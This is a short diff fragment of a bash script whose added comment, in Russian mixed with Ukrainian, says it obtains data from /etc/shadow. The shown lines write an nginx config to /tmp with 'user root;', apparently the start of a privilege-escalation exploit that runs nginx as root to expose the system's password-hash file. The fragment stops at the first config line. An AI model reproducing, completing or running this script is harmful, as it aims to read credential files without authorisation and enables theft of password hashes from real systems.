@@ -1,4 +1,7 @@
 #!/bin/bash
+
+# Скрипт для получения даних их /etc/shadow
+
 echo "[+] making config"
 cat <<EOF >/tmp/nginx.conf
 user root;
